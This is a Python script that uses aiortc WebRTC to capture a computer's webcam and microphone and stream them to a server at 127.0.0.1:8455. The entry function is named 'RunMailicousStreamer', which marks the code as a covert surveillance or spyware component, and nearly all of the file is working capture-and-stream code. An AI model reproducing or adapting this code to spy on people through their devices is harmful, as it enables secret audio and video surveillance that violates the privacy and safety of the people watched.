import cv2
import numpy as np
import asyncio
import sounddevice as sd
from aiortc import RTCPeerConnection, RTCSessionDescription
from aiortc.mediastreams import AudioStreamTrack, VideoStreamTrack
class CameraVideoTrack(VideoStreamTrack):
    def __init__(self):
        super().__init__()
        self.cap = cv2.VideoCapture(0)
    async def recv(self):
        pts, time_base = await self.next_timestamp()
        ret, frame = self.cap.read()
        if not ret:
            raise Exception("Cannot read camera")
        import av
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        video_frame = av.VideoFrame.from_ndarray(frame, format="rgb24")
        video_frame.pts = pts
        video_frame.time_base = time_base
        return video_frame
class MicrophoneAudioTrack(AudioStreamTrack):
    def __init__(self):
        super().__init__()
        self.samplerate = 44100
        self.channels = 1
        self.buffer = []
        def callback(indata, frames, time, status):
            if status:
                print(status)
            self.buffer.append(indata.copy())
        self.stream = sd.InputStream(callback=callback,
                                     channels=self.channels,
                                     samplerate=self.samplerate)
        self.stream.start()
    async def recv(self):
        import av
        pts, time_base = await self.next_timestamp()
        if len(self.buffer) == 0:
            import numpy as np
            data = np.zeros((1024, 1), dtype=np.float32)
        else:
            data = self.buffer.pop(0)
        frame = av.AudioFrame.from_ndarray(data, layout="mono")
        frame.sample_rate = self.samplerate
        frame.pts = pts
        frame.time_base = time_base
        return frame
async def run_client():
    pc = RTCPeerConnection()
    pc.addTrack(CameraVideoTrack())
    pc.addTrack(MicrophoneAudioTrack())
    import aiohttp
    async with aiohttp.ClientSession() as session:
        offer = await pc.createOffer()
        await pc.setLocalDescription(offer)
        async with session.post("http://127.0.0.1:8455/offer", json={
            "sdp": pc.localDescription.sdp,
            "type": pc.localDescription.type
        }) as resp:
            answer = await resp.json()
        await pc.setRemoteDescription(RTCSessionDescription(
            sdp=answer["sdp"],
            type=answer["type"]
        ))
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            pass
def RunMailicousStreamer():
    asyncio.run(run_client())